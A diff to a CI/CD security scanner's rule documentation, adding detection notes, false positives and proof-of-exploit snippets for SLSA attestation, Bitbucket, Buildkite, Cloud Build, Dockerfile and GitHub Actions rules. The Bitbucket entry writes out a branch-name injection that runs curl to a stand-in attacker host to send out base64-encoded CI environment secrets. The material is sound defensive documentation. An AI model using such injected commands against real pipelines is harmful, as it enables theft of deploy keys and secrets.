+**Recommendation.** Configure the builder to emit a non-empty ``materials`` (SLSA v0.2) or ``resolvedDependencies`` (SLSA v1) list with one entry per ingredient the build consumed. For BuildKit, set ``--attest=type=provenance,mode=max`` so the resolved-base-image + checked-out source land in the attestation. For slsa-github-generator the L3 presets populate this automatically; teams running a custom generator must add the inputs explicitly. An empty list is structurally indistinguishable from 'the build had no inputs' and breaks downstream vulnerability correlation.
+
+**Known false positives.**
+
+- Trivial ``FROM scratch`` images with no build-time dependencies legitimately have an empty materials list. The rule has no way to distinguish 'trivial build' from 'instrumentation gap', the SLSA spec treats both as the same fail-closed signal. Suppress per-image via ``--ignore-file`` once you've verified the build genuinely has nothing to attest.
+- Some builders (older BuildKit, hand-rolled generators) populate ``materials`` but omit the ``digest`` map, which the SLSA spec marks recommended-not-required. This rule accepts that shape today (list non-empty = pass); a future ATTEST-NNN will tighten to require digest coverage.
+
+**Seen in the wild.**
+
+- [SLSA v1 spec, Build track L3 requirements](https://slsa.dev/spec/v1.0/levels#build-l3): resolved dependencies are a Build-track requirement, not an optional courtesy. The provenance was supposed to answer 'what went into this artifact'; an empty resolvedDependencies list answers 'we declined to say', which is materially worse than 'we didn't produce an attestation' because consumers see a signed-and-stamped document and trust it.
+- tj-actions/changed-files compromise (CVE-2025-30066, March 2025): forensic teams reconstructing the blast radius needed to know which downstream images consumed the compromised action's outputs. Builds whose provenance carried materials lists pinpointed the exposure in minutes; builds without paid for the gap in days of manual review.
+
+**Proof of exploit.**
+
+# Vulnerable: a hand-rolled or older-Buildx provenance
+# emitter ships a Statement whose materials list is empty.
+# (Modern BuildKit ``--attest=type=provenance`` populates a
+# materials list by default; ``mode=max`` enriches it with
+# decoded build args / fuller layer metadata, but the
+# rule fires structurally on missing/empty regardless of
+# which emitter produced the output.)
+
+# Resulting provenance (SLSA v0.2 predicate):
+#   {
+#     "builder": {"id": "https://my-internal-ci/runner@v3"},
+#     "buildType": "https://example.com/buildtype/v1",
+#     "invocation": { ... configSource present ... },
+#     "materials": []          <-- empty
+#   }
+
+# Attack surface: a downstream CVE advisory for the
+# resolved base image (say, ubuntu:22.04 -> a specific
+# digest known to ship the vulnerable libcurl) can't be
+# correlated to this image because the provenance never
+# recorded which base image was resolved at build time.
+# Forensic response shifts from "grep provenance for
+# affected digest" to "rebuild every image and inspect
+# layer contents."
+
+# Safe: use a builder that emits resolved materials. For
+# BuildKit that's any recent Buildx with
+# ``--attest=type=provenance`` (default mode already
+# populates the list; pass ``mode=max`` if you also want
+# decoded build args + fuller layer metadata).
+$ docker buildx build \
+    --attest=type=provenance,mode=max \
+    --tag registry.example/app:v1.4.2 \
+    --push .
+
+# Resulting provenance:
+#   "materials": [
+#     {"uri": "pkg:docker/ubuntu@22.04",
+#      "digest": {"sha256": "<resolved digest>"}},
+#     {"uri": "git+https://github.com/foo/bar@v1.4.2",
+#      "digest": {"sha1": "<commit sha>"}}
+#   ]
+
+**Source:** [`ATTEST-004`](../providers/oci.md#attest-004) in the [OCI manifest provider](../providers/oci.md).
+
+#### `ATTEST-005`: In-toto Statement subject is missing or unpinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-005 }
+
+**Evidences:** [`Build.L2.Signed`](#ctrl-build-l2-signed) Build L2: Provenance is authenticated and cannot be forged by tenants, [`Build.L3.NonFalsifiable`](#ctrl-build-l3-nonfalsifiable) Build L3: Provenance cannot be falsified by the build's own tenant.
+
+**How this is detected.** Walks every parsed in-toto Statement (SLSA provenance + SBOM both) and validates the subject array. Three failure shapes:
+  - ``subject`` is missing or an empty list, the Statement attests nothing.
+  - A subject entry has no ``digest`` map, the entry names an artifact but doesn't bind to its bytes.
+  - A digest value is empty, all-zeros, or not valid hex, the bind exists structurally but the value is a placeholder.
+
+Hex validation is conservative: the value must consist entirely of ``0-9`` and ``a-f`` (case-insensitive) and the length must be a multiple of two (a valid byte encoding). Algorithm-specific length checks (``sha256`` = 64 chars, ``sha1`` = 40) are not enforced here, some registries truncate to a 16-char prefix and the rule accepts those as long as the bytes are well-formed.
+
+**Recommendation.** Configure the builder to emit Statements with a non-empty ``subject`` array whose entries each carry a populated ``digest`` map. The digest value must be a real hex encoding of the artifact's bytes, an empty string or all-zeros placeholder defeats verification. For BuildKit this is automatic when ``--attest=type=provenance`` is set alongside ``--push``; older Buildx versions sometimes emitted Statements with empty subjects, upgrade if you see this fire on a recent build. For slsa-github-generator and cosign-attested workflows the subject is populated by the framework, an empty subject usually means a custom attestor was wired up incorrectly.
+
+**Known false positives.**
+
+- Some experimental attestor implementations emit Statements with placeholder subjects for in-flight verification (the bytes are still being uploaded when the attestation is signed). Suppress per-manifest via ``--ignore-file`` if the team has a documented review of the deferred-binding pattern; the default expectation for any image promoted to a production registry is a subject digest that matches the actual image bytes.
+- Multi-subject Statements (one attestation covering multiple sibling artifacts) are accepted, as long as *every* entry has a populated digest. A partially-filled subject array fires because the unbound entries are the substitution surface, the rest don't compensate.
+
+**Seen in the wild.**
+
+- [in-toto Statement spec](https://github.com/in-toto/attestation/blob/main/spec/v1/statement.md): the subject digest is the cryptographic bind between a signed envelope and the artifact bytes. A placeholder value reduces the attestation to a free-floating signature attackers can re-attach.
+- [SLSA v1.0 verifying artifacts](https://slsa.dev/spec/v1.0/verifying-artifacts): consumers MUST compare the attestation's subject digest against the artifact they're about to use. A signed envelope whose subject is unbound to artifact bytes passes signature verification but fails this comparison step trivially — which is exactly what an attacker exploits when re-attaching a valid signature to a tampered image.
+
+**Proof of exploit.**
+
+# Vulnerable: a Statement signed by a trusted builder but
+# carrying an empty subject digest. The signature is valid;
+# the bind to the image bytes is not.
+{
+  "_type": "https://in-toto.io/Statement/v1",
+  "subject": [
+    {"name": "image", "digest": {"sha256": ""}}
+  ],
+  "predicateType": "https://slsa.dev/provenance/v1",
+  "predicate": { ... }
+}
+
+# Attack: an attacker who can re-publish the signed DSSE
+# envelope (the envelope is public on the OCI registry the
+# image is pushed to) attaches it to a tampered image. The
+# consumer's verifier checks the signature (valid, the
+# builder did sign this Statement), checks the source repo
+# (valid, ATTEST-002 passes), checks the builder identity
+# (valid, ATTEST-001 passes), and never gets to compare
+# the subject digest because the digest is empty. Result:
+# the tampered image looks fully attested.
+
+# Safe: subject digest populated with the actual image
+# config digest BuildKit / slsa-github-generator emit by
+# default when wired up correctly.
+{
+  "_type": "https://in-toto.io/Statement/v1",
+  "subject": [
+    {"name": "image",
+     "digest": {
+       "sha256": "4d5a6e7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f70819"
+                    "a2b3c4d5e6f70819a2b3c4d5e6f70819"
+     }}
+  ],
+  "predicateType": "https://slsa.dev/provenance/v1",
+  "predicate": { ... }
+}
+
+**Source:** [`ATTEST-005`](../providers/oci.md#attest-005) in the [OCI manifest provider](../providers/oci.md).
+
+#### `ATTEST-006`: SLSA provenance lacks a meaningful buildType <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-006 }
+
+**Evidences:** [`Build.L1.Provenance`](#ctrl-build-l1-provenance) Build L1: Provenance describing how the artifact was produced is generated.
+
+**How this is detected.** Reads the ``buildType`` claim at the spec-appropriate path: v0.2 at ``predicate.buildType``, v1 at ``predicate.buildDefinition.buildType``. Fires when the claim is missing, an empty string, or a known placeholder (``example.com``, ``unknown``, ``n/a``, ``tbd``). A well-shaped buildType is a URI with a scheme and a path component; the rule does a conservative URI-shape check to catch typos like a bare repository name or an unfilled template token.
+
+Doesn't validate that the URI is reachable or that the schema it names is one a verifier knows about; that's policy-layer work (an allowlist of trusted buildType URIs is a separate consumer-side concern).
+
+**Recommendation.** Configure the builder to emit a concrete ``buildType`` URI naming the schema the provenance follows. For slsa-github-generator that's automatic (``https://github.com/slsa-framework/slsa-github-generator/<workflow>@<ref>``). For BuildKit the canonical URI is ``https://github.com/Attestations/GitHubHostedActions@v1`` or one of the SLSA-listed build types at https://slsa.dev/buildtypes/. Custom in-house generators should publish their own buildType URI that points at a stable schema doc; the URI doesn't need to be globally registered, but it does need to be resolvable so consumers can review the schema.
+
+**Known false positives.**
+
+- Some experimental generators emit a buildType under a placeholder URI during development (``https://example.com/buildtype/v1``). The rule fires on those by design; the canonical fix is to publish a real schema URI before any image ships to a registry that downstream consumers trust. Suppress per-manifest via ``--ignore-file`` only when the team has a documented review of the placeholder's intended scope.
+- BuildKit < v0.10 emitted Statements without a buildType field at all. Modern Buildx always populates it; if the rule fires on a current build, the provenance configuration is likely incomplete rather than the Buildx version being too old.
+
+**Seen in the wild.**
+
+- [SLSA v1.0 provenance spec](https://slsa.dev/spec/v1.0/provenance): buildType is REQUIRED on every Statement. The spec calls out that consumers MUST refuse provenance whose buildType they don't recognize, which means an under-specified buildType reduces the attestation to advisory text the verifier can't act on.
+- [SLSA build types catalog](https://slsa.dev/buildtypes/): the publicly registered buildType URIs SLSA-aware tooling knows how to verify. Provenance that names an unregistered URI is acceptable when paired with a documented schema, but provenance with no URI at all is structurally unverifiable.
+
+**Proof of exploit.**
+
+# Vulnerable: a self-rolled SLSA generator that omits the
+# buildType field. The predicate carries every other
+# claim (builder, materials, configSource) but consumers
+# can't tell which schema those claims follow.
+{
+  "_type": "https://in-toto.io/Statement/v1",
+  "predicateType": "https://slsa.dev/provenance/v1",
+  "predicate": {
+    "buildDefinition": {
+      "externalParameters": {...},
+      "resolvedDependencies": [...]
+      // no buildType key
+    },
+    "runDetails": {"builder": {"id": "..."}}
+  }
+}
+
+# Attack surface: a consumer verifying this Statement with
+# a policy of 'only accept buildType = <list>' has no field
+# to match against. Two common downstream outcomes:
+#   1. The verifier rejects every Statement (over-strict);
+#   2. The verifier accepts every Statement (over-loose),
+#      which means an attacker forging materials in a
+#      different schema slips by because the verifier
+#      can't tell the schemas apart.
+
+# Safe: emit a concrete buildType URI. For slsa-github-
+# generator the framework fills this in automatically:
+{
+  "predicate": {
+    "buildDefinition": {
+      "buildType": "https://github.com/slsa-framework/"
+                    "slsa-github-generator/generic@v2",
+      ...
+    }
+  }
+}
+
+**Source:** [`ATTEST-006`](../providers/oci.md#attest-006) in the [OCI manifest provider](../providers/oci.md).
+
+#### `ATTEST-007`: SBOM packages lack supplier / originator attribution <span class="pg-sev pg-sev--low">LOW</span> { #detail-attest-007 }
+
+**Evidences:** [`Build.L1.Provenance`](#ctrl-build-l1-provenance) Build L1: Provenance describing how the artifact was produced is generated.
+
+**How this is detected.** Walks every SBOM attestation (SPDX + CycloneDX) and counts components / packages without supplier attribution. SPDX checks ``packages[*].supplier``; CycloneDX checks ``components[*].supplier.name`` (the spec uses an object with a ``name`` key, unlike SPDX's bare string). A package passes when the field exists, is non-empty, and isn't the ``NOASSERTION`` sentinel.
+
+Severity LOW because the failure mode is downstream correlation friction rather than direct execution risk. Pair with ATTEST-003 (version completeness) for the full SBOM-quality story; an SBOM that has versions but no suppliers, or suppliers but no versions, is only half actionable.
+
+**Recommendation.** Configure the SBOM emitter to populate supplier and (where applicable) originator fields for every component. Syft / Trivy / cdxgen all support supplier inference from package-manager metadata; the field is most often missing because the generator was invoked without the relevant ecosystem authority configured. For hand-rolled SBOM pipelines, derive ``supplier`` from the package registry (``pkg:npm/foo`` -> ``Organization: https://npmjs.com``) or the upstream maintainer's published metadata. ``NOASSERTION`` is acceptable only when the package truly has no identifiable supplier; treating it as a routine default defeats downstream attribution.
+
+**Known false positives.**
+
+- Air-gapped builds where the SBOM emitter genuinely cannot resolve a supplier (private registry without ecosystem metadata) legitimately ship ``NOASSERTION`` for affected packages. Suppress per-manifest via ``--ignore-file`` when the gap is documented; the default expectation for any image promoted to a production registry is supplier attribution on every third-party component.
+- System-injected components (``glibc`` from a distroless base image, kernel symbols) sometimes carry no supplier because the SBOM emitter didn't have distro metadata available. The rule fires by design; the canonical fix is to provide a supplier of last resort (e.g. the base image vendor) rather than to suppress.
+
+**Seen in the wild.**
+
+- [NTIA SBOM Minimum Elements report](https://www.ntia.gov/files/ntia/publications/sbom_minimum_elements_report.pdf) (2021): supplier name is listed as a minimum required element. NTIA's quality assessment of real-world SBOMs consistently flagged supplier coverage as one of the lowest-scoring dimensions across producers.
+- Typosquat and mirror-replay supply-chain incidents (the broad class behind event-stream, ua-parser-js, and tj-actions): the attacker substitutes a package whose name + version match a legitimate one but whose supplier differs. SBOMs with supplier attribution let downstream consumers detect the substitution by comparing publisher identity; SBOMs without it carry no signal at all.
+
+**Source:** [`ATTEST-007`](../providers/oci.md#attest-007) in the [OCI manifest provider](../providers/oci.md).
+
 #### `BB-001`: pipe: action not pinned to exact version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-001 }
 
 **Evidences:** [`Build.L3.NonFalsifiable`](#ctrl-build-l3-nonfalsifiable) Build L3: Provenance cannot be falsified by the build's own tenant.
@@ -727,6 +1151,46 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** $BITBUCKET_BRANCH, $BITBUCKET_TAG, and $BITBUCKET_PR_* are populated from SCM event metadata the attacker controls. Interpolating them unquoted into a shell command lets a crafted branch or tag name can execute inline.
 
 **Recommendation.** Always double-quote interpolations of ref-derived variables (`"$BITBUCKET_BRANCH"`). Avoid passing them to `eval`, `sh -c`, or unquoted command arguments.
+
+**Known false positives.**
+
+- Pipelines that *parse* a ref name rather than execute it (``echo "$BITBUCKET_BRANCH" | cut -d/ -f2``) still interpolate the variable but expose no shell-execution surface for the value. The rule has no AST-level understanding of the surrounding shell context, so a well-quoted use that happens to live near an unrelated ``$(...)`` substitution can read as an offender. Suppress per-step via ``--ignore-file`` if the value is only consumed as data.
+
+**Proof of exploit.**
+
+# Vulnerable: branch name interpolated unquoted into shell.
+image: alpine:latest
+pipelines:
+  pull-requests:
+    '**':
+      - step:
+          name: triage
+          script:
+            - echo Building $BITBUCKET_BRANCH
+            - ./scripts/build.sh $BITBUCKET_BRANCH
+
+# Attack: open a PR from a branch whose name is shell:
+#
+#   git checkout -b 'foo;curl https://attacker/x \
+#     -d "$(env|base64)";:'
+#
+# Bitbucket substitutes ``$BITBUCKET_BRANCH`` literally before
+# the shell parses the line, so the `;` becomes a command
+# separator and the curl exfils the step's env (which holds
+# every repository / workspace variable in scope, including
+# deploy keys configured for the pipeline).
+
+# Safe: double-quote and pass via env so the value is only
+# consumed as data.
+      - step:
+          name: triage
+          script:
+            - echo "Building $BRANCH"
+            - ./scripts/build.sh "$BRANCH"
+          # Bitbucket has no declarative env block; assign
+          # via shell so the value is captured as a single
+          # argv element from the controlled assignment.
+          # (Equivalent: BRANCH="$BITBUCKET_BRANCH"; ...)
 
 **Source:** [`BB-002`](../providers/bitbucket.md#bb-002) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -936,6 +1400,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Known false positives.**
+
+- Names that imply a secret but actually store a non-sensitive identifier flag here: ``CACHE_KEY: build-2024-Q4``, ``API_KEY_PATH: /var/run/secrets/api``, ``SECRET_NAME: my-vault-secret``. The rule has no way to tell from the name + literal alone whether the value is the credential or merely a reference to one. Also: deliberate test fixtures and documentation snippets that embed canonical example values (``AKIAIOSFODNN7EXAMPLE``) match the strong-pattern set; this is intentional, real-world copies of those example literals usually mean a docs paste was never substituted.
+
 **Source:** [`BK-002`](../providers/buildkite.md#bk-002) in the [Buildkite provider](../providers/buildkite.md).
 
 #### `BK-003`: Untrusted Buildkite variable interpolated in command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-003 }
@@ -945,6 +1413,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Buildkite passes branch / tag / message metadata as environment variables. Putting them inside ``$(...)`` or shelling out with the value unquoted is a classic command-injection vector. The detection fires on the unquoted interpolation form and on use inside ``eval`` / ``$(...)``.
 
 **Recommendation.** Don't interpolate ``$BUILDKITE_BRANCH``, ``$BUILDKITE_TAG``, ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_PULL_REQUEST_*``, or ``$BUILDKITE_BUILD_AUTHOR*`` directly into shell commands. These come from the pull request / branch and are attacker-controllable. Quote them and assign to a local variable first (``branch="$BUILDKITE_BRANCH"; ./script --branch "$branch"``), or pass them as arguments to a script you own.
+
+**Known false positives.**
+
+- The single-token double-quoted form (``"$BUILDKITE_BRANCH"``) is already excluded; multi-token shell snippets that *look* unquoted but are consumed safely by the downstream tool (e.g. a ``./script.sh $BUILDKITE_BRANCH`` where the script treats argv as data and never re-evaluates) still flag. The rule has no AST-level understanding of the called script, suppress per-step via ``--ignore-file`` once you've verified the script handles untrusted argv safely (or quote the use, which is the better fix).
 
 **Source:** [`BK-003`](../providers/buildkite.md#bk-003) in the [Buildkite provider](../providers/buildkite.md).
 
@@ -1016,7 +1488,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Evidences:** [`Build.L2.Signed`](#ctrl-build-l2-signed) Build L2: Provenance is authenticated and cannot be forged by tenants.
 
-**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognises cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.
+**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.
 
 **Recommendation.** Add a signing step, install cosign once (``brew install cosign`` in the agent image, or a ``cosign-install`` plugin) and call ``cosign sign --yes <ref>`` after the build. For container images pushed to ECR / GCR / GHCR, the same call signs by digest. Publish the signature alongside the artifact and verify it at consumption time.
 
@@ -1118,7 +1590,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Evidences:** [`Build.L2.Signed`](#ctrl-build-l2-signed) Build L2: Provenance is authenticated and cannot be forged by tenants.
 
-**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognises cosign, sigstore, slsa-framework, and notation-sign as signing tools.
+**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-framework, and notation-sign as signing tools.
 
 **Recommendation.** Add a signing step to the pipeline, e.g. install cosign and run `cosign sign`, or use the `sigstore` CLI. Publish the signature alongside the artifact and verify it at consumption time.
 
@@ -1128,7 +1600,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Evidences:** [`Build.L1.Provenance`](#ctrl-build-l1-provenance) Build L1: Provenance describing how the artifact was produced is generated.
 
-**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognises CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
+**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
 
 **Recommendation.** Add an SBOM generation step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the build artifacts so consumers can ingest it into their vulnerability management pipeline.
 
@@ -1333,6 +1805,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** Replace ``ADD https://...`` with a multi-step ``RUN``: download the file with ``curl -fsSLo``, verify a known-good checksum (``sha256sum -c``) or signature (``cosign verify-blob``), then extract / install. Better still: download the artifact in a builder stage and ``COPY`` it across. That way the verifier runs once at build time, not per-pull.
 
+**Known false positives.**
+
+- ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.
+
 **Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).
 
 #### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }
@@ -1408,6 +1884,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** The ``_``-prefix is Cloud Build's naming convention for user substitutions; they are editable via build trigger UI, ``gcloud builds submit --substitutions``, and the REST API. Built-in substitutions (``$PROJECT_ID``, ``$COMMIT_SHA``, ``$BUILD_ID``) are derived from the trigger event and are *not* treated as user-controlled by this rule.
 
 **Recommendation.** Either disable ``options.dynamicSubstitutions`` (it defaults to false) or move user substitutions (``$_FOO``) out of step ``args``, pass them through ``env:`` and reference them inside a shell script the builder runs. Dynamic substitution re-evaluates bash syntax after variable expansion, giving trigger-config editors a script-injection channel.
+
+**Known false positives.**
+
+- Pipelines that enable ``dynamicSubstitutions`` solely to use bash parameter expansion on *built-in* substitutions (``${PROJECT_ID/-/_}``) still flag if any step also references a ``$_USER_VAR``, even when the user sub lands in a context that can't reach a shell. The rule has no AST-level awareness of which substitution is consumed by which shell context. Suppress per-step via ``--ignore-file`` after verifying the user sub never feeds bash re-evaluation.
 
 **Source:** [`GCB-004`](../providers/cloudbuild.md#gcb-004) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -1487,6 +1967,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** Pass user substitutions through ``env:`` (or ``secretEnv:`` for sensitive values) and reference them inside a checked-in shell script rather than splicing them directly into ``args``. If the step truly needs to invoke shell logic inline, switch the entrypoint to the underlying tool (``docker``, ``gcloud``, ``gsutil``) and let the tool see the substitution as an argument, not as shell text.
 
+**Known false positives.**
+
+- Substitutions whose values are *server-controlled* in practice (e.g. the trigger always supplies a SHA from ``$_HEAD_COMMIT_SHA`` aliased into a ``$_BUILD_TAG`` by the trigger config) still match the user-sub regex because Cloud Build can't distinguish locked from editable trigger fields. Suppress per-step via ``--ignore-file`` once you've verified your trigger policy prevents arbitrary substitution overrides, ideally combined with ``options.substitutionOption: MUST_MATCH`` (GCB-022) to make the lock explicit.
+
 **Source:** [`GCB-019`](../providers/cloudbuild.md#gcb-019) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 #### `GCB-021`: No private worker pool, build runs on the shared default pool <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-021 }
@@ -1528,6 +2012,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Walks every step's ``args:`` / ``entrypoint:`` / ``env:`` / ``dir:`` / ``id:`` / ``waitFor:`` for ``$_NAME`` tokens (Cloud Build's user-substitution syntax is leading underscore + uppercase / digits / underscore) and cross-references against the top-level ``substitutions:`` mapping. Built-in substitutions (``$PROJECT_ID``, ``$REPO_NAME``, ``$BRANCH_NAME``, ``$TAG_NAME``, ``$COMMIT_SHA``, ``$SHORT_SHA``, ``$REVISION_ID``, ``$BUILD_ID``, ``$LOCATION``, ``$TRIGGER_NAME``, ``$_HEAD_*``, ``$_BASE_*``, ``$_PR_NUMBER`` and the ``$_HEAD_REPO_URL`` family) are Cloud Build server-set and don't appear in ``substitutions:``; the rule allow-lists them so they don't false-positive.
 
 **Recommendation.** Add an entry for every ``$_USER_VAR`` referenced anywhere in the build to the top-level ``substitutions:`` block, either with a sensible default or with an empty string if the trigger always supplies the value. Cloud Build's default ``options.substitutionOption: MUST_MATCH`` then fails the build at parse time on undeclared references (catching typos at the gate). With the looser ``ALLOW_LOOSE`` opt-in (GCB-022) undeclared references silently expand to the empty string, which masks the bug and quietly broadens any shell command that interpolates the value.
+
+**Known false positives.**
+
+- Cloud Build deployments triggered exclusively via ``gcloud builds submit --substitutions=_FOO=bar`` (without a build trigger) may legitimately reference ``$_FOO`` without declaring it under ``substitutions:`` because the value is always supplied from the CLI. The scanner can't observe trigger / CLI configuration, only the YAML. Declaring the variable with an empty-string default is the canonical fix; ``--ignore-file`` is the escape hatch when that's not practical.
 
 **Source:** [`GCB-023`](../providers/cloudbuild.md#gcb-023) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -1606,7 +2094,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 **Seen in the wild.**
 
 - GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020), the canonical write-up. Demonstrates how a fork PR that lands in a ``pull_request_target`` workflow with the PR head checked out runs in the base repo's privileged context.
-- Trail of Bits ``Codecov-style supply chain via pwn requests`` (2021): showed the primitive against widely-used Actions workflows. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.
+- [Keeping your GitHub Actions and workflows secure: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) (GitHub Security Lab, 2020): catalogued real-world Actions carrying the same primitive. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.
 
 **Proof of exploit.**
 
@@ -1676,7 +2164,7 @@ jobs:
 **Seen in the wild.**
 
 - [GitHub Security Lab disclosure](https://securitylab.github.com/research/github-actions-untrusted-input/) (2020): a sweep of public Actions found dozens of widely-used workflows interpolating ``github.event.issue.title`` / ``pull_request.title`` directly into shell. Any commenter or PR author could run arbitrary commands in the maintainer's CI.
-- Trail of Bits ``pwn-request`` research (2021): demonstrated the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR could exfiltrate every secret the workflow could see. Mitigation is the same: never interpolate context into shell, route through ``env:``.
+- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (GitHub Security Lab, 2020): the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR exfiltrates every secret the workflow can see. Mitigation: never interpolate context into shell, route through ``env:``.
 
 **Proof of exploit.**
 
@@ -1747,7 +2235,7 @@ jobs:
 
 **Evidences:** [`Build.L1.Provenance`](#ctrl-build-l1-provenance) Build L1: Provenance describing how the artifact was produced is generated.
 
-**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognises CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
+**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.
 
 **Recommendation.** Add an SBOM generation step, `anchore/sbom-action`, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the release so consumers can ingest it into their vuln-management pipeline.
 
@@ -1843,7 +2331,7 @@ steps:
 
 **Evidences:** [`Build.L2.Hosted`](#ctrl-build-l2-hosted) Build L2: Builds run on a hosted build platform (not a developer workstation), [`Build.L3.Ephemeral`](#ctrl-build-l3-ephemeral) Build L3: Build environment is ephemeral and provisioned fresh for each run.
 
-**How this is detected.** Self-hosted runners that don't tear down between jobs leak filesystem and process state. A PR-triggered job writes to `/tmp`; a subsequent prod-deploy job on the same runner reads it. The mitigation is the runner's `--ephemeral` mode, the runner exits after one job and re-registers fresh. The check looks for an `ephemeral` label on the `runs-on` value; without one, the runner is presumed reusable. Recognises all three `runs-on` shapes: string, list, and `{ group, labels }` dict form.
+**How this is detected.** Self-hosted runners that don't tear down between jobs leak filesystem and process state. A PR-triggered job writes to `/tmp`; a subsequent prod-deploy job on the same runner reads it. The mitigation is the runner's `--ephemeral` mode, the runner exits after one job and re-registers fresh. The check looks for an `ephemeral` label on the `runs-on` value; without one, the runner is presumed reusable. Recognizes all three `runs-on` shapes: string, list, and `{ group, labels }` dict form.
 
 **Recommendation.** Configure the self-hosted runner to register with `--ephemeral` (the runner exits after one job and is freshly registered), and add an `ephemeral` label so this check can verify it. Consider actions-runner-controller for ephemeral pools.
 
@@ -1860,6 +2348,10 @@ steps:
 **How this is detected.** `on: issue_comment` (and `discussion_comment`) fires for every comment on every issue or discussion in the repository. On public repos this means any GitHub user can trigger workflow execution. If the workflow runs commands, deploys, or accesses secrets, the attacker controls timing and can inject payloads through the comment body.
 
 **Recommendation.** Add an `if:` condition that checks `github.event.comment.author_association` (e.g. `contains('OWNER MEMBER COLLABORATOR', ...)`), `github.event.sender.login`, or `github.actor` against an allowlist. Without a guard, any GitHub user can trigger the workflow by posting a comment.
+
+**Known false positives.**
+
+- Guard detection runs against the whole workflow as text rather than against parsed ``if:`` expressions, so a guard token appearing in an unrelated context (a comment, a step name, a description field) reads as satisfying the rule. Conversely, guards expressed via alternative author-association idioms the regex doesn't recognize (``github.event.issue.user.login``, an org-membership API check inside a script) leave the rule firing even though the workflow is safely gated. Suppress per-workflow via ``--ignore-file`` once you've verified the gate logic; tighten the guard expression to use the recognized tokens if possible.
 
 **Source:** [`GHA-013`](../providers/github.md#gha-013) in the [GitHub Actions provider](../providers/github.md).
 
@@ -1892,7 +2384,7 @@ steps:
 **Seen in the wild.**
 
 - [Codecov Bash uploader compromise](https://about.codecov.io/security-update/) (April 2021): an attacker modified the codecov.io/bash uploader script (commonly fetched via ``curl -s codecov.io/bash | bash``) to exfiltrate environment variables from CI runners (AWS keys, GitHub tokens, signing keys) at thousands of customers for over two months before discovery.
